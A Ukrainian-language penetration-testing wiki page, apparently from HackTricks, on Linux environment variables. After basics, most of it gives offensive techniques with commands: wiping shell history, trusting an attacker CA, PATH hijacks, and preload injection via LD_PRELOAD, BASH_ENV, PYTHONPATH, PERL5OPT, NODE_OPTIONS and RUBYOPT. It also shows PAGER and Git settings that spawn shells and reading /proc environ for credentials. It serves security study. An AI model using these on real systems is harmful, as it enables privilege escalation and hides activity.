# Змінні середовища Linux

{{#include ../../banners/hacktricks-training.md}}

## Глобальні змінні

Глобальні змінні **успадковуватимуться** **дочірніми процесами**.

Ви можете створити глобальну змінну для поточного сеансу, виконавши:
```bash
export MYGLOBAL="hello world"
echo $MYGLOBAL #Prints: hello world
```
Ця змінна буде доступна вашим поточним сесіям і їхнім дочірнім процесам.

Ви можете **видалити** змінну за допомогою:
```bash
unset MYGLOBAL
```
## Локальні змінні

**Локальні змінні** можна **отримати доступ** лише з **поточної оболонки/скрипту**.
```bash
LOCAL="my local"
echo $LOCAL
unset LOCAL
```
## Список поточних змінних
```bash
set
env
printenv
cat /proc/$$/environ
cat /proc/`python -c "import os; print(os.getppid())"`/environ
```
Вміст `/proc/*/environ` **розділений NUL-байтами**, тому ці варіанти зазвичай легше читати:
```bash
tr '\0' '\n' </proc/$$/environ | sort -u
tr '\0' '\n' </proc/<PID>/environ | sort -u
```
Якщо ви шукаєте **облікові дані** або **цікаву конфігурацію сервісів** у успадкованих середовищах, також перевірте [Linux Post Exploitation](../post-exploitation/linux-post-exploitation/README.md).

## Поширені змінні

Джерело: [https://geek-university.com/linux/common-environment-variables/](https://geek-university.com/linux/common-environment-variables/)<sup>[[5]](#references)</sup>

- **DISPLAY** – дисплей, який використовується **X**. Цю змінну зазвичай встановлено в значення **:0.0**, що означає перший дисплей на поточному комп’ютері.
- **EDITOR** – бажаний текстовий редактор користувача.
- **HISTFILESIZE** – максимальна кількість рядків у файлі історії.
- **HISTSIZE** – кількість рядків, доданих до файлу історії після завершення користувачем сеансу.
- **HOME** – ваш домашній каталог.
- **HOSTNAME** – ім’я хоста комп’ютера.
- **LANG** – ваша поточна мова.
- **MAIL** – розташування поштової скриньки користувача. Зазвичай **/var/spool/mail/USER**.
- **MANPATH** – список каталогів для пошуку сторінок довідки.
- **OSTYPE** – тип операційної системи.
- **PS1** – стандартне запрошення в bash.
- **PATH** – зберігає шляхи до всіх каталогів, що містять двійкові файли, які ви хочете виконувати, вказуючи лише ім’я файлу, а не відносний або абсолютний шлях.
- **PWD** – поточний робочий каталог.
- **SHELL** – шлях до поточної командної оболонки (наприклад, **/bin/bash**).
- **TERM** – поточний тип термінала (наприклад, **xterm**).
- **TZ** – ваш часовий пояс.
- **USER** – ваше поточне ім’я користувача.

## Цікаві змінні для hacking

Не кожна змінна однаково корисна. З offensive perspective пріоритетними є змінні, які змінюють **шляхи пошуку**, **файли запуску**, **поведінку dynamic linker** або **аудит/логування**.

### **HISTFILESIZE**

**Змініть значення цієї змінної на 0**, щоб після **завершення сеансу** **файл історії** (\~/.bash_history) було **обрізано до 0 рядків**.
```bash
export HISTFILESIZE=0
```
### **HISTSIZE**

Змініть **значення цієї змінної на 0**, щоб команди **не зберігалися в історії в пам’яті** та не записувалися назад у **файл історії** (\~/.bash_history).
```bash
export HISTSIZE=0
```
### **HISTCONTROL**

Якщо **значення цієї змінної встановлено на `ignorespace` або `ignoreboth`**, будь-яка команда, перед якою додано пробіл, не буде збережена в history.
```bash
export HISTCONTROL=ignorespace
```

```bash
$ echo "to save or"
$  echo "not to save"
```
### **HISTFILE**

Спрямуйте **файл історії** до **`/dev/null`** або повністю скасуйте його. Зазвичай це надійніше, ніж лише змінити розмір історії.
```bash
export HISTFILE=/dev/null
unset HISTFILE
```
### http_proxy & https_proxy

Процеси використовуватимуть оголошений тут **proxy**, щоб підключатися до інтернету через **http або https**.
```bash
export http_proxy="http://10.10.10.10:8080"
export https_proxy="http://10.10.10.10:8080"
```
### all_proxy & no_proxy

- `all_proxy`: проксі за замовчуванням для інструментів/протоколів, які його підтримують.
- `no_proxy`: список обходу (hosts/domains/CIDRs), які мають підключатися напряму.
```bash
export all_proxy="socks5h://10.10.10.10:1080"
export no_proxy="localhost,127.0.0.1,.corp.local,10.0.0.0/8"
```
Можуть використовуватися варіанти в нижньому та верхньому регістрі залежно від інструмента (`http_proxy`/`HTTP_PROXY`, `no_proxy`/`NO_PROXY`).

### SSL_CERT_FILE & SSL_CERT_DIR

Процеси довірятимуть сертифікатам, указаним у **цих змінних середовища**. Це корисно, щоб змусити такі інструменти, як **`curl`**, **`git`**, HTTP-клієнти Python або менеджери пакетів, довіряти CA, контрольованому зловмисником (наприклад, щоб проксі перехоплення виглядав легітимним).
```bash
export SSL_CERT_FILE=/path/to/ca-bundle.pem
export SSL_CERT_DIR=/path/to/ca-certificates
```
### **PATH**

Якщо привілейована обгортка/скрипт виконує команди **без абсолютних шляхів**, перша контрольована атакувальником директорія в `PATH` має пріоритет. Це примітив, що лежить в основі багатьох **PATH hijacks** у `sudo`, cron jobs, shell wrappers і власних SUID helpers. Шукайте `env_keep+=PATH`, слабкий `secure_path` або обгортки, які викликають `tar`, `service`, `cp`, `python` тощо за іменем.
```bash
mkdir -p /dev/shm/bin
cat > /dev/shm/bin/tar <<'EOF'
#!/bin/sh
echo '[+] PATH hijack reached' >&2
id
EOF
chmod +x /dev/shm/bin/tar
PATH=/dev/shm/bin:$PATH vulnerable-wrapper
```
Для повних ланцюжків підвищення привілеїв із використанням `PATH` див. [Linux Privilege Escalation](linux-privilege-escalation/README.md).

### **HOME & XDG_CONFIG_HOME**

`HOME` — це не лише посилання на директорію: багато інструментів автоматично завантажують **dotfiles**, **плагіни** та **конфігурацію для кожного користувача** з `$HOME` або `$XDG_CONFIG_HOME`. Якщо привілейований workflow зберігає ці значення, **config injection** може бути простішим за підміну бінарного файлу.
```bash
export HOME=/dev/shm/fakehome
export XDG_CONFIG_HOME=/dev/shm/fakehome/.config
mkdir -p "$XDG_CONFIG_HOME"
```
Цікаві цілі включають `.gitconfig`, `.wgetrc`, `.curlrc`, `.inputrc`, `.pythonrc.py` і специфічні для інструментів файли, такі як `.terraformrc`.

### **LD_PRELOAD, LD_LIBRARY_PATH & LD_AUDIT**

Ці змінні впливають на **динамічний linker**:

- `LD_PRELOAD`: примусово завантажує додаткові shared objects першими.
- `LD_LIBRARY_PATH`: додає каталоги пошуку бібліотек на початок списку.
- `LD_AUDIT`: завантажує бібліотеки-аудитори, які відстежують завантаження бібліотек і розв'язання символів.

Вони надзвичайно цінні для **hooking**, **instrumentation** і **ескалації привілеїв**, якщо привілейована команда зберігає їх. У режимі **secure-execution** (`AT_SECURE`, наприклад, для setuid/setgid/capabilities) loader видаляє або обмежує багато з цих змінних. Однак parser bugs на цьому ранньому етапі loader усе ще мають високий вплив, оскільки вони виконуються **до** цільової програми.<sup>[[2]](#references)</sup>
```bash
env | grep -E '^LD_'
ldso=$(ls /lib64/ld-linux-*.so.* /lib/*-linux-gnu/ld-linux-*.so.* 2>/dev/null | head -n1)
"$ldso" --list-diagnostics /bin/true | head
"$ldso" --list-tunables /bin/true | head
```
### **GLIBC_TUNABLES**

`GLIBC_TUNABLES` змінює ранню поведінку glibc (наприклад, параметри налаштування алокатора) і дуже корисна в exploit-лабораторіях. Це також має значення з погляду безпеки, оскільки **динамічний завантажувач аналізує її на дуже ранньому етапі**. Вразливість **Looney Tunables** 2023 року стала хорошим нагадуванням про те, що одна змінна середовища, яку аналізує завантажувач, може перетворитися на **примітив локального підвищення привілеїв** проти програм SUID.<sup>[[6]](#references)</sup>
```bash
GLIBC_TUNABLES=glibc.malloc.tcache_count=0 ./binary
```
### **BASH_ENV і ENV**

Якщо **Bash** запускається **неінтерактивно**, він перевіряє `BASH_ENV` і виконує цей файл перед запуском цільового скрипту. Якщо Bash викликається як `sh` або в інтерактивному режимі POSIX, також може перевірятися `ENV`. Це класичний спосіб перетворити shell-обгортку на виконання коду, якщо середовище контролюється атакувальником.
```bash
cat > /tmp/pre.sh <<'EOF'
echo '[+] sourced before the target script'
EOF
BASH_ENV=/tmp/pre.sh bash -c 'echo target'
```
Сам Bash вимикає ці startup-файли, якщо **реальні/ефективні ідентифікатори відрізняються**, якщо не використано `-p`, тому точна поведінка залежить від того, як wrapper запускає shell. Будьте обережні з привілейованими wrapper, які викликають `setuid()`/`setgid()` **до** запуску Bash: коли ідентифікатори знову збігаються, Bash може довіряти `BASH_ENV`, `ENV` та пов’язаному стану shell, які в іншому випадку ігнорувалися.<sup>[[1]](#references)</sup>

### **PYTHONPATH, PYTHONHOME, PYTHONSTARTUP & PYTHONINSPECT**

Ці змінні змінюють спосіб запуску Python:

- `PYTHONPATH`: додає шляхи пошуку імпортів на початок списку.
- `PYTHONHOME`: переміщує дерево стандартної бібліотеки.
- `PYTHONSTARTUP`: виконує файл перед появою інтерактивного prompt.
- `PYTHONINSPECT=1`: переходить в інтерактивний режим після завершення скрипту.

Вони корисні проти скриптів обслуговування, debugger-ів, shell-ів і wrapper, які викликають Python із контрольованим environment. `python -E` і `python -I` ігнорують усі змінні `PYTHON*`.
```bash
mkdir -p /tmp/pylib
printf 'print("owned from PYTHONPATH")\n' > /tmp/pylib/htmod.py
PYTHONPATH=/tmp/pylib python3 -c 'import htmod'
PYTHONPATH=/tmp/pylib python3 -I -c 'import htmod'   # ignored in isolated mode
```
Нещодавнім прикладом із реального світу стала LPE у **needrestart** на системах Ubuntu/Debian у 2024 році: scanner, що працював від імені root, скопіював `PYTHONPATH` непривілейованого процесу з `/proc/<PID>/environ`, а потім виконав Python. Опублікований exploit розмістив `importlib/__init__.so` у шляху, контрольованому attacker, завдяки чому Python виконав код attacker під час власної ініціалізації — ще до того, як hard-coded script helper-а взагалі мав значення.<sup>[[3]](#references)</sup>

### **PERL5OPT & PERL5LIB**

Perl має такі ж корисні startup variables:

- `PERL5LIB`: додає каталоги бібліотек на початок списку.
- `PERL5OPT`: inject-ить switches так, ніби вони були в кожному командному рядку `perl`.

Це може примусово активувати **автоматичне завантаження модулів** або змінити поведінку interpreter-а до того, як target script виконає щось цікаве. Perl ігнорує ці variables у контекстах **taint / setuid / setgid**, але вони все одно мають велике значення для звичайних wrapper-ів, що запускаються від root, CI jobs, installers і custom sudoers rules.
```bash
mkdir -p /tmp/perllib
cat > /tmp/perllib/HT.pm <<'EOF'
package HT;
BEGIN { print "PERL5OPT_TRIGGERED\n" }
1;
EOF
PERL5LIB=/tmp/perllib PERL5OPT=-MHT perl -e 'print "target\n"'
```
### **NODE_OPTIONS**

`NODE_OPTIONS` додає **прапорці CLI Node.js** перед аргументами кожного процесу `node`, який успадковує середовище. Це робить змінну корисною проти обгорток, CI-завдань, допоміжних процесів Electron і правил sudo, які зрештою запускають Node. Найцікавішими прапорцями з offensive perspective зазвичай є:

- `--require <file>`: попередньо завантажує файл CommonJS перед цільовим скриптом.
- `--import <module>`: попередньо завантажує ES-модуль перед цільовим скриптом.

Node відхиляє деякі небезпечні прапорці в `NODE_OPTIONS`, але `--require` і `--import` явно дозволені та обробляються **до** звичайних аргументів командного рядка.<sup>[[4]](#references)</sup>
```bash
cat > /tmp/preload.js <<'EOF'
console.error('[+] NODE_OPTIONS preload reached')
EOF
NODE_OPTIONS='--require /tmp/preload.js' node -e 'console.log("target")'
```
Для віддалених gadget chains, які опосередковано встановлюють `NODE_OPTIONS` (наприклад, через prototype-pollution до RCE), перегляньте [цю іншу сторінку](../../pentesting-web/deserialization/nodejs-proto-prototype-pollution/prototype-pollution-to-rce.md).

### **RUBYLIB і RUBYOPT**

Ruby пропонує такий самий клас зловживань під час запуску:

- `RUBYLIB`: додає каталоги на початок шляху завантаження Ruby.
- `RUBYOPT`: вставляє параметри командного рядка, як-от `-r`, у кожен виклик `ruby`.
```bash
mkdir -p /tmp/rubylib
printf 'warn "[+] RUBYOPT preload reached"\n' > /tmp/rubylib/ht.rb
RUBYLIB=/tmp/rubylib RUBYOPT='-rht' ruby -e 'puts :target'
```
Уразливості **needrestart** 2024 року показали, що це не просто лабораторний трюк: той самий root-owned helper, який був уразливим до зловживання `PYTHONPATH`, також можна було змусити запустити Ruby з контрольованим зловмисником `RUBYLIB`, завантаживши `enc/encdb.so` зі зловмисницького каталогу.<sup>[[3]](#references)</sup>

### **PAGER, MANPAGER, GIT_PAGER, GIT_EDITOR & LESSOPEN**

Деякі інструменти не просто зчитують шлях із environment; вони передають це значення до **shell**, **editor** або **input preprocessor**. Через це наведені нижче змінні особливо цікаві, коли privileged wrapper запускає `git`, `man`, `less` або подібні переглядачі тексту:

- `PAGER`, `MANPAGER`, `GIT_PAGER`: визначають команду pager.
- `GIT_EDITOR`, `VISUAL`, `EDITOR`: визначають команду editor, часто разом з аргументами.
- `LESSOPEN`, `LESSCLOSE`: визначають pre/post-processors, які запускаються, коли `less` відкриває файл.
```bash
PAGER='sh -c "exec sh 0<&1 1>&1"' man man

cat > /tmp/lesspipe.sh <<'EOF'
#!/bin/sh
echo '[+] LESSOPEN triggered' >&2
cat "$1"
EOF
chmod +x /tmp/lesspipe.sh
LESSOPEN='|/tmp/lesspipe.sh %s' less /etc/hosts
```
Git також підтримує **ін'єкцію конфігурації лише через змінні середовища** без запису на диск за допомогою `GIT_CONFIG_COUNT`, `GIT_CONFIG_KEY_<n>` і `GIT_CONFIG_VALUE_<n>`:
```bash
GIT_CONFIG_COUNT=1 \
GIT_CONFIG_KEY_0=core.pager \
GIT_CONFIG_VALUE_0='sh -c "exec sh 0<&1 1>&1"' \
git -p help
```
З точки зору post-exploitation також пам'ятайте, що успадковані середовища часто містять **облікові дані**, **налаштування proxy**, **service tokens** або **cloud keys**. Перегляньте [Linux Post Exploitation](../post-exploitation/linux-post-exploitation/README.md), щоб дізнатися про пошук у `/proc/<PID>/environ` і `systemd` `Environment=`.

### PS1

Змініть вигляд свого prompt.

[**Це приклад**](https://gist.github.com/carlospolop/43f7cd50f3deea972439af3222b68808)

Root:

![PERL5OPT & PERL5LIB - PS1: Це приклад](<../images/image (897).png>)

Звичайний користувач:

![PERL5OPT & PERL5LIB - PS1: Одне, два та три завдання, запущені у background](<../images/image (740).png>)

Одне, два та три завдання, запущені у background:

![PERL5OPT & PERL5LIB - PS1: Одне, два та три завдання, запущені у background](<../images/image (145).png>)

Одне завдання у background, одне зупинене, а остання команда завершилася некоректно:

![PERL5OPT & PERL5LIB - PS1: Одне завдання у background, одне зупинене, а остання команда завершилася некоректно](<../images/image (715).png>)

## Посилання

- [1] [Посібник GNU Bash - Файли запуску Bash](https://www.gnu.org/software/bash/manual/html_node/Bash-Startup-Files.html)
- [2] [ld.so(8) - Сторінка посібника Linux](https://man7.org/linux/man-pages/man8/ld.so.8.html)
- [3] [Qualys - LPE у needrestart](https://www.qualys.com/2024/11/19/needrestart/needrestart.txt)
- [4] [Документація Node.js CLI - `NODE_OPTIONS`](https://nodejs.org/api/cli.html)
- [5] [Поширені змінні середовища - Geek University](https://geek-university.com/linux/common-environment-variables/)
- [6] [CVE-2023-4911: Looney Tunables - Local Privilege Escalation у ld.so бібліотеки glibc - Qualys](https://blog.qualys.com/vulnerabilities-threat-research/2023/10/03/cve-2023-4911-looney-tunables-local-privilege-escalation-in-the-glibcs-ld-so)

{{#include ../../banners/hacktricks-training.md}}
